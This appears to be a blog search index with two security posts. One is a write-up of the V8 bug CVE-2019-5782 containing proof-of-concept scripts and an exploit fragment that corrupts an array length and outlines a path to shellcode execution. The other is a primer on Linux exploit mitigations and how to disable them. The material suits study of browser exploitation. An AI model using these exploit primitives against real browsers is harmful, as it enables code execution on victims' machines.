<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CVE-2019-5782_zhaoqixun_2018_11_16发_7.2</title>
    <url>/2020/11/06/browser_about/CVE-2019-5782-zhaoqixun-2018-11-16%E5%8F%91-7-2/</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- Report: Nov 2018</span><br><span class="line">- Fix: Jan 2019</span><br><span class="line">- Credit: Zhao Qixun(@S0rryMybad) of Qihoo 360 Vulcan Team</span><br><span class="line">- Similar to &#96;Math.expm1&#96; vulnerability.</span><br><span class="line">- Wrong typer&#39;s assumption caused Out-Of-Bound Read&#x2F;Write</span><br></pre></td></tr></table></figure>
<ul>
<li><p><a href="https://twitter.com/S0rryMybad/status/1090438643582267394" target="_blank" rel="noopener">https://twitter.com/S0rryMybad/status/1090438643582267394</a></p>
<p><a href="https://github.com/vngkv123/aSiagaming/blob/master/Chrome-v8-906043/Chrome%20V8%20-%20-CVE-2019-5782%20Tianfu%20Cup%20Qihoo%20360%20S0rrymybad-%20-ENG-.pdf" target="_blank" rel="noopener">Write up</a></p>
</li>
</ul>
<p>fix info <a href="https://chromium-review.googlesource.com/c/v8/v8/+/1363142" target="_blank" rel="noopener">https://chromium-review.googlesource.com/c/v8/v8/+/1363142</a><br>fix commit <a href="https://chromium.googlesource.com/v8/v8/+/deee0a87c0567f9e9bf18e1c8e2417c2f09d9b04" target="_blank" rel="noopener">https://chromium.googlesource.com/v8/v8/+/deee0a87c0567f9e9bf18e1c8e2417c2f09d9b04</a></p>
<p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=906043" target="_blank" rel="noopener">bugs_chromium</a> </p>
<ol>
<li>CVE-2019-5782</li>
<li>Blink&gt;JavaScript&gt;WebAssembly Blink&gt;JavaScript</li>
</ol>
<p><a href="https://de4dcr0w.github.io/CVE-2019-5782-v8%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8.html" target="_blank" rel="noopener">CVE-2019-5782 v8数组越界漏洞分析与利用</a></p>
<a id="more"></a>
<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>可利用v8版本 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">得到版本v8版本  b474b3102bd4a95eafcdb68e0e44656046132bc9</span><br><span class="line">git checkout b474b3102bd4a95eafcdb68e0e44656046132bc9</span><br><span class="line">gclient sync -D --verbose</span><br><span class="line"></span><br><span class="line"><span class="comment"># v8编译</span></span><br><span class="line">tools/dev/v8gen.py x64.debug -vv     <span class="comment">#可能出问题</span></span><br><span class="line">tools/dev/v8gen.py x64.release -vv</span><br><span class="line"></span><br><span class="line">ninja -C out.gn/x64.debug d8 -v <span class="comment"># debug 可能出问题</span></span><br><span class="line">ninja -C out.gn/x64.release d8 -v</span><br></pre></td></tr></table></figure>

<h2 id="fix分析"><a href="#fix分析" class="headerlink" title="fix分析"></a>fix分析</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> kArgumentsBits = <span class="number">16</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> kMaxArguments = (<span class="number">1</span> &lt;&lt; kArgumentsBits) - <span class="number">2</span>; <span class="comment">// 16384</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// https://chromium-review.googlesource.com/c/v8/v8/+/1363142/3/src/compiler/verifier.cc#b1256</span></span><br><span class="line">    <span class="keyword">case</span> IrOpcode::kNewArgumentsElements:</span><br><span class="line">      CheckValueInputIs(node, <span class="number">0</span>, Type::ExternalPointer());</span><br><span class="line">      </span><br><span class="line">      CheckValueInputIs(node, <span class="number">1</span>, Type::Range(-Code::kMaxArguments, Code::kMaxArguments, zone));</span><br><span class="line">      CheckTypeIs(node, Type::OtherInternal());</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">-&gt;</span><br><span class="line">    <span class="keyword">case</span> IrOpcode::kNewArgumentsElements:</span><br><span class="line">      CheckValueInputIs(node, <span class="number">0</span>, Type::ExternalPointer());</span><br><span class="line">      </span><br><span class="line">      CheckValueInputIs(node, <span class="number">1</span>, Type::Unsigned30());</span><br><span class="line"></span><br><span class="line"><span class="comment">// https://chromium-review.googlesource.com/c/v8/v8/+/1363142/3/src/compiler/type-cache.h#b167</span></span><br><span class="line">  Type <span class="keyword">const</span> kArgumentsLengthType = Type::Range(<span class="number">0.0</span>, Code::kMaxArguments, zone());</span><br><span class="line">-&gt;</span><br><span class="line">  Type <span class="keyword">const</span> kArgumentsLengthType = Type::Unsigned30();</span><br></pre></td></tr></table></figure>
<h2 id="1-2-PoC-分析"><a href="#1-2-PoC-分析" class="headerlink" title="1.2. PoC 分析"></a>1.2. PoC 分析</h2><p>poc1 <a href="https://chromium-review.googlesource.com/c/v8/v8/+/1363142/3/test/mjsunit/regress/regress-crbug-906043.js" target="_blank" rel="noopener">https://chromium-review.googlesource.com/c/v8/v8/+/1363142/3/test/mjsunit/regress/regress-crbug-906043.js</a><br>As similar to Math.expm1, x &gt;&gt; 16 is evaluated as <code>false</code> at simplified-lowering phase.<br>We can do Out-Of-Bounds R/W via <strong>CheckBounds elimination</strong>.</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params">arg</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> x = <span class="built_in">arguments</span>.length;</span><br><span class="line">  a1 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span><br><span class="line">  a1[<span class="number">0</span>] = <span class="number">1.1</span>;</span><br><span class="line">  a2 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span><br><span class="line">  a2[<span class="number">0</span>] = <span class="number">1.1</span>;</span><br><span class="line">  a1[(x &gt;&gt; <span class="number">16</span>) * <span class="number">21</span>] = <span class="number">1.39064994160909e-309</span>;  <span class="comment">// 0xffff00000000</span></span><br><span class="line">  a1[(x &gt;&gt; <span class="number">16</span>) * <span class="number">41</span>] = <span class="number">8.91238232205e-313</span>;     <span class="comment">// 0x2a00000000</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a1, a2;</span><br><span class="line"><span class="keyword">var</span> a3 = [<span class="number">1.1</span>, <span class="number">2.2</span>];</span><br><span class="line">a3.length = <span class="number">0x11000</span>;</span><br><span class="line">a3.fill(<span class="number">3.3</span>);</span><br><span class="line"><span class="keyword">var</span> a4 = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) fun(...a4);</span><br><span class="line">%OptimizeFunctionOnNextCall(fun);</span><br><span class="line">fun(...a4);</span><br><span class="line">res = fun(...a3);</span><br><span class="line">assertEquals(<span class="number">16</span>, a2.length);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">8</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">  assertEquals(<span class="literal">undefined</span>, a2[i]); <span class="comment">//有问题</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>poc2 <a href="https://github.com/tunz/js-vuln-db/blob/master/v8/CVE-2019-5782.md" target="_blank" rel="noopener">https://github.com/tunz/js-vuln-db/blob/master/v8/CVE-2019-5782.md</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">opt</span>(<span class="params">arg</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> x = <span class="built_in">arguments</span>.length;</span><br><span class="line">  a1 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span><br><span class="line">  a2 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">2</span>); a2[<span class="number">0</span>] = <span class="number">1.1</span>; a2[<span class="number">1</span>] = <span class="number">1.1</span>;</span><br><span class="line">  a1[(x &gt;&gt; <span class="number">16</span>) * <span class="number">0xf00000</span>] = <span class="number">1.39064994160909e-309</span>; <span class="comment">// 0xffff00000000</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a1, a2;</span><br><span class="line"><span class="keyword">let</span> small = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">let</span> large = [<span class="number">1.1</span>,<span class="number">1.1</span>];</span><br><span class="line">large.length = <span class="number">65536</span>;</span><br><span class="line">large.fill(<span class="number">1.1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j&lt; <span class="number">100000</span>; j++) &#123;</span><br><span class="line">    opt.apply(<span class="literal">null</span>, small);</span><br><span class="line">&#125;</span><br><span class="line">opt.apply(<span class="literal">null</span>, large);</span><br></pre></td></tr></table></figure>

<h3 id="开始分析poc2"><a href="#开始分析poc2" class="headerlink" title="开始分析poc2"></a>开始分析poc2</h3><h4 id="typed-lowering分析"><a href="#typed-lowering分析" class="headerlink" title="typed lowering分析"></a>typed lowering分析</h4><p><img src="media/16045662135155.jpg" alt=""><br>在SpeculativeNumberShiftRight节点上面有一个LoadField节点，在这个优化阶段，编译器无法得到LoadFiled节点的值，所以对NumberShiftRight进行 range analysis 时，会将其范围直接认为是int32的最大和最小值。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Type OperationTyper::NumberShiftRight(Type lhs, Type rhs) &#123;            </span><br><span class="line">          <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"[-] min_lhs : "</span>  &lt;&lt; min_lhs  &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">          <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"[-] max_lhs : "</span>  &lt;&lt; max_lhs  &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">          <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"[-] min_rhs : "</span>  &lt;&lt; min_rhs  &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">          <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"[-] max_rhs : "</span>  &lt;&lt; max_rhs  &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">          <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"[-] min : "</span>  &lt;&lt; min  &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">          <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"[-] max : "</span>  &lt;&lt; max  &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">          </span><br><span class="line">[-] max_lhs : <span class="number">2147483647</span></span><br><span class="line">[-] min_rhs : <span class="number">16</span></span><br><span class="line">[-] max_rhs : <span class="number">16</span></span><br><span class="line">[-] min : <span class="number">-32768</span></span><br><span class="line">[-] max : <span class="number">32767</span></span><br><span class="line">[-] min_lhs : <span class="number">0</span></span><br><span class="line">[-] max_lhs : <span class="number">65534</span></span><br><span class="line">[-] min_rhs : <span class="number">16</span></span><br><span class="line">[-] max_rhs : <span class="number">16</span></span><br><span class="line">[-] min : <span class="number">0</span></span><br><span class="line">[-] max : <span class="number">0</span></span><br></pre></td></tr></table></figure>

<h4 id="escape-analysis-phase"><a href="#escape-analysis-phase" class="headerlink" title="escape analysis phase"></a>escape analysis phase</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./d8  --shell  --allow-natives-syntax --trace-turbo ~/Desktop/v8_test/CVE-2019-5782_zhaoqixun_2018_11_16/poc2.js</span><br></pre></td></tr></table></figure>
<p>win7下wen访问web分析<br>turbolizer 分析后看到在 load elimination,escape analysis时</p>
<p>Although x can be large than 65534, optimizer thinks x &gt;&gt; 16 is 0.<br>That causes <strong>simplified-lowerer</strong> to do <strong>CheckBounds</strong> elimination.</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">VisitCheckBounds</span><span class="params">(Node* node, SimplifiedLowering* lowering)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">          <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"[-] index_type.Min() : "</span>  &lt;&lt; index_type.Min()  &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">          <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"[-] index_type.Max() : "</span>  &lt;&lt; index_type.Max()  &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">          <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"[-] length_type.Min() : "</span> &lt;&lt; length_type.Min() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure>
<p>As we expected, false propagation makes index_type_Min/Max() 0.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[-] TypeArgumentsLength was called</span><br><span class="line">[-] index_type.Min() : 0</span><br><span class="line">[-] index_type.Max() : 0</span><br><span class="line">[-] length_type.Min() : 16</span><br><span class="line">[-] index_type.Min() : 0</span><br><span class="line">[-] index_type.Max() : 0</span><br><span class="line">[-] length_type.Min() : 16</span><br></pre></td></tr></table></figure>
<p>the result of checking the turbolizer in the <strong>escape analysis phase</strong>,<br><img src="media/16036985117250.jpg" alt=""></p>
<p>which shows that checkbounds exist. Here’s what we can check for this <strong>CheckBounds</strong>:<br><img src="media/16036980630734.jpg" alt=""></p>
<h4 id="simplified-lowering-phases"><a href="#simplified-lowering-phases" class="headerlink" title="simplified-lowering phases"></a>simplified-lowering phases</h4><p>在SimplifiedLoweringPhase阶段会对SpeculativeNumberShiftRight的范围再次计算，用于消除CheckBounds：<br><code>16 &gt;&gt; x</code> is calculated, and multiply constant value (51) to result value.<br>And final result value is input node of <strong>CheckBounds</strong>.<br>However, after the <strong>simplified-lowering phases</strong>, this <strong>CheckBounds</strong> Node will disappear as follows.<br><img src="media/16036997734263.jpg" alt=""></p>
<p>So, now there is no boundary check, so you can <strong>freely access OOB R / W.</strong> :)<br>Exploit itself is incredibly simple, since OOB R / W is available</p>
<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p>Google_CTF_2018_DuplicateAdditionReducer.md<br>The above link covers Turbofan fairly well.</p>
<p>Math.expm1-35C3_CTF_2018_V8_Krautflare patch_ctf +0和-0不分的 优化错误</p>
<h4 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h4><p>因为错误的假定，typer输入了错误的长度范围</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; len(<span class="string">"10000000000000000"</span>)</span><br><span class="line">17</span><br><span class="line">&gt;&gt;&gt; len(<span class="string">"1111111111111111"</span>)</span><br><span class="line">16</span><br><span class="line">&gt;&gt;&gt; 0x1ffff &gt;&gt; 16</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<p>最终能访问  1*index form的位置</p>
<h3 id="最终利用"><a href="#最终利用" class="headerlink" title="最终利用"></a>最终利用</h3><p>OOB R/W 有效后，调整unboxed double array’s l;ength去造成 另一个oob r/w.<br>修改 backing_store of ArrayBuffer 通过仿制 ArrayBuffer在他之后。</p>
<ol>
<li>用 rop payload </li>
<li>wasm function 的v8 进程内存创建了rwx page.放shellcode在这个区段然后arb code</li>
</ol>
<h4 id="有了越界写，怎么知道写入哪里写入-victim-array-length-这里是51"><a href="#有了越界写，怎么知道写入哪里写入-victim-array-length-这里是51" class="headerlink" title="有了越界写，怎么知道写入哪里写入 victim array length  这里是51"></a>有了越界写，怎么知道写入哪里写入 victim array length  这里是51</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params">arg</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">let</span> x = <span class="built_in">arguments</span>.length;<span class="comment">//vulnerability</span></span><br><span class="line"></span><br><span class="line">	a1 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span><br><span class="line">	a1[<span class="number">0</span>] = <span class="number">1.1</span>;</span><br><span class="line"></span><br><span class="line">	a2 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span><br><span class="line">	a2[<span class="number">0</span>] = <span class="number">1.1</span>;</span><br><span class="line"></span><br><span class="line">	victim = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// maybe x &gt;&gt; 16 -&gt; false propagation -&gt; checkbounds elimination</span></span><br><span class="line">	<span class="comment">// a1[(x &gt;&gt; 16) * 21] = 1.39064994160909e-309; // 0xffff00000000</span></span><br><span class="line">	<span class="comment">// a1[(x &gt;&gt; 16) * 41] = 8.91238232205e-313;  // 0x2a00000000</span></span><br><span class="line"></span><br><span class="line">  a1[(x &gt;&gt; <span class="number">16</span>) * &#123;m_index&#125;] = <span class="number">8.691694759794e-311</span>;    <span class="comment">// victim array -&gt; change length property to 0x1000</span></span><br><span class="line">	<span class="comment">//a1[(x &gt;&gt; 16) * 51] = 8.691694759794e-311;    // victim array -&gt; change length property to 0x1000</span></span><br><span class="line">	<span class="comment">//a1[(x &gt;&gt; 16) * 51] = u2d(0, 0x1000);       // victim array -&gt; change length property to 0x1000</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>a1在前，victim在后，从前往后写入<br>写python脚本去遍历m_index 范围 0-100 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 ~/Desktop/v8_test/CVE-2019-5782_zhaoqixun_2018_11_16/CVE-2019-5782_exp2_py.py  -f ~/Desktop/v8_test/CVE-2019-5782_zhaoqixun_2018_11_16/CVE-2019-5782_exp2.js</span><br><span class="line">...</span><br><span class="line">write new path : /tmp/CVE-2019-5782_exp2_51.js</span><br><span class="line">./d8 --allow-natives-syntax /tmp/CVE-2019-5782_exp2_51.js</span><br><span class="line">[+] <span class="built_in">log</span>: start ...</span><br><span class="line">[+] <span class="built_in">log</span>: gc ...</span><br><span class="line">[-] index_type.Min() : 0</span><br><span class="line">[-] index_type.Max() : 0</span><br><span class="line">[-] length_type.Min() : 16</span><br><span class="line">[-] index_type.Min() : 0</span><br><span class="line">[-] index_type.Max() : 0</span><br><span class="line">[-] length_type.Min() : 16</span><br><span class="line">[+] <span class="built_in">log</span>: trigger ...</span><br><span class="line">[+] <span class="built_in">log</span>: victim.length = 4096</span><br><span class="line">Trace/breakpoint <span class="built_in">trap</span> (core dumped)</span><br></pre></td></tr></table></figure>
<h4 id="尝试拿到任意读写"><a href="#尝试拿到任意读写" class="headerlink" title="尝试拿到任意读写"></a>尝试拿到任意读写</h4><p>之前有了越界写，可以写入 victim 长度，然后再控制victim后面的ArrayBuffer 长度。</p>
<ol>
<li>在后面构造Array 如 <code>let leaked = [0xdada, 0xadad, f, {}, 1.1];</code> ，尝试读取 victim[index] == 0xdada和 0xadad 找到 wasm_f_idx，拿到 wasm_obj_address</li>
<li>在后面构造ArrayBuffer 如 <code>let ab = new ArrayBuffer(0x50);</code>,尝试读取 victim[index] ==0x50 找到 ab_ArrayBuffer_length_idx,这时候可以控制 ArrayBuffer ‘s backing_store。</li>
<li>通过 ArrayBuffer ‘s backing_store 可以AAR，AAW</li>
<li>注意最后rwx写入时候偏移不用+1</li>
</ol>
<h4 id="最终利用-两种实现"><a href="#最终利用-两种实现" class="headerlink" title="最终利用-两种实现"></a>最终利用-两种实现</h4><p>…</p>
]]></content>
      <categories>
        <category>chrome</category>
      </categories>
      <tags>
        <tag>bugs</tag>
      </tags>
  </entry>
  <entry>
    <title>linux pwn入门学习到放弃</title>
    <url>/2020/05/20/linux-pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E5%88%B0%E6%94%BE%E5%BC%83/</url>
    <content><![CDATA[<h1 id="linux-pwn入门学习到放弃"><a href="#linux-pwn入门学习到放弃" class="headerlink" title="linux pwn入门学习到放弃"></a>linux pwn入门学习到放弃</h1><p>[TOC]</p>
<p>PWN是一个黑客语法的俚语词，自”own”这个字引申出来的，意为玩家在整个游戏对战中处在胜利的优势。<br>本文记录菜鸟学习linux pwn入门的一些过程，详细介绍linux上的保护机制，分析一些常见漏洞如栈溢出,堆溢出，use after free等,以及一些常见工具集合介绍等。</p>
<a id="more"></a>

<h2 id="linux程序的常用保护机制"><a href="#linux程序的常用保护机制" class="headerlink" title="linux程序的常用保护机制"></a>linux程序的常用保护机制</h2><p>先来学习一些关于linux方面的保护措施，操作系统提供了许多安全机制来尝试降低或阻止缓冲区溢出攻击带来的安全风险，包括DEP、ASLR等。从checksec入手来学习linux的保护措施。checksec可以检查可执行文件各种安全属性，包括Arch,RELRO,Stack,NX，PIE等。</p>
<ul>
<li><p>pip安装pwntools后自带checksec检查elf文件.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">checksec xxxx.so</span><br><span class="line">    Arch:     aarch64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>另外笔者操作系统为macOS,一些常用的linux命令如readelf需要另外brew install binutils安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brew install binutils</span><br></pre></td></tr></table></figure>
</li>
<li><p>当然也可以独自安装checksec</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;slimm609&#x2F;checksec.sh&#x2F;archive&#x2F;2.1.0.tar.gz</span><br><span class="line">tar xvf 2.1.0.tar.gz</span><br><span class="line">.&#x2F;checksec.sh-2.1.0&#x2F;checksec --file&#x3D;xxx</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/05/20/vTLRcGwqF16QrNZ.jpg" alt="-w1311"></p>
</li>
<li><p>gdb里peda插件里自带的checksec功能</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb level4  &#x2F;&#x2F;加载目标程序</span><br><span class="line">gdb-peda$ checksec </span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="CANNARY金丝雀-栈保护-Stack-protect-栈溢出保护"><a href="#CANNARY金丝雀-栈保护-Stack-protect-栈溢出保护" class="headerlink" title="CANNARY金丝雀(栈保护)/Stack protect/栈溢出保护"></a>CANNARY金丝雀(栈保护)/Stack protect/栈溢出保护</h3><p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary/金丝雀。<br>gcc在4.2版本中添加了-fstack-protector和-fstack-protector-all编译参数以支持栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。<br>开启命令如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c                       &#x2F;&#x2F; 默认情况下，开启Canary保护</span><br><span class="line">gcc -fno-stack-protector  -o test test.c &#x2F;&#x2F;禁用栈保护</span><br><span class="line">gcc -fstack-protector     -o test test.c &#x2F;&#x2F;启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">gcc -fstack-protector-all -o test test.c &#x2F;&#x2F;启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure>
<h3 id="FORTIFY-轻微的检查"><a href="#FORTIFY-轻微的检查" class="headerlink" title="FORTIFY/轻微的检查"></a>FORTIFY/轻微的检查</h3><p>fority其实非常轻微的检查，用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets以及宽字符的变体。<br>FORTIFY_SOURCE设为1，并且将编译器设置为优化1(gcc -O1)，以及出现上述情形，那么程序编译时就会进行检查但又不会改变程序功能<br>开启命令如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c		                &#x2F;&#x2F; 默认情况下，不会开这个检查</span><br><span class="line">gcc -D_FORTIFY_SOURCE&#x3D;1 -o test test.c &#x2F;&#x2F; 较弱的检查</span><br><span class="line">gcc -D_FORTIFY_SOURCE&#x3D;1 仅仅只会在编译时进行检查 (特别像某些头文件 #include &lt;string.h&gt;)</span><br><span class="line">_FORTIFY_SOURCE设为1，并且将编译器设置为优化1(gcc -O1)，以及出现上述情形，那么程序编译时就会进行检查但又不会改变程序功能</span><br><span class="line"></span><br><span class="line">gcc -D_FORTIFY_SOURCE&#x3D;2 -o test test.c &#x2F;&#x2F; 较强的检查</span><br><span class="line">gcc -D_FORTIFY_SOURCE&#x3D;2 程序执行时也会有检查 (如果检查到缓冲区溢出，就终止程序)</span><br><span class="line">_FORTIFY_SOURCE设为2，有些检查功能会加入，但是这可能导致程序崩溃。</span><br></pre></td></tr></table></figure>
<p>看编译后的二进制汇编我们可以看到gcc生成了一些附加代码，通过对数组大小的判断替换strcpy, memcpy, memset等函数名，达到防止缓冲区溢出的作用。</p>
<h3 id="NX-DEP-数据执行保护"><a href="#NX-DEP-数据执行保护" class="headerlink" title="NX/DEP/数据执行保护"></a>NX/DEP/数据执行保护</h3><p>数据执行保护(DEP)（Data Execution Prevention） 是一套软硬件技术，能够在内存上执行额外检查以帮助防止在系统上运行恶意代码。在 Microsoft Windows XP Service Pack 2及以上版本的Windows中，由硬件和软件一起强制实施 DEP。<br>支持 DEP 的 CPU 利用一种叫做NX(No eXecute) 不执行”的技术识别标记出来的区域。如果发现当前执行的代码没有明确标记为可执行（例如程序执行后由病毒溢出到代码执行区的那部分代码），则禁止其执行，那么利用溢出攻击的病毒或网络攻击就无法利用溢出进行破坏了。如果 CPU 不支持 DEP，Windows 会以软件方式模拟出 DEP 的部分功能。<br>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。<br>开启命令如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c &#x2F;&#x2F; 默认情况下，开启NX保护</span><br><span class="line">gcc -z execstack -o test test.c &#x2F;&#x2F; 禁用NX保护</span><br><span class="line">gcc -z noexecstack -o test test.c &#x2F;&#x2F; 开启NX保护</span><br></pre></td></tr></table></figure>
<p>在Windows下，类似的概念为DEP（数据执行保护），在最新版的Visual Studio中默认开启了DEP编译选项。</p>
<h3 id="ASLR-Address-space-layout-randomization"><a href="#ASLR-Address-space-layout-randomization" class="headerlink" title="ASLR (Address space layout randomization)"></a>ASLR (Address space layout randomization)</h3><p>ASLR是一种针对缓冲区溢出的安全保护技术，通过对<strong>堆、栈、共享库映射</strong>等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。如今Linux、FreeBSD、Windows等主流操作系统都已采用了该技术。此技术需要操作系统和软件相配合。ASLR在linux中使用此技术后，杀死某程序后重新开启,地址就会会改变</p>
<p>在Linux上<br>关闭ASLR，切换至root用户，输入命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>

<p>开启ASLR，切换至root用户，输入命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 2 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
<p>上面的序号代表意思如下:<br>0 - 表示关闭进程地址空间随机化。<br>1 - 表示将mmap的基址，stack和vdso页面随机化。<br>2 - 表示在1的基础上增加栈（heap）的随机化。<br>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</p>
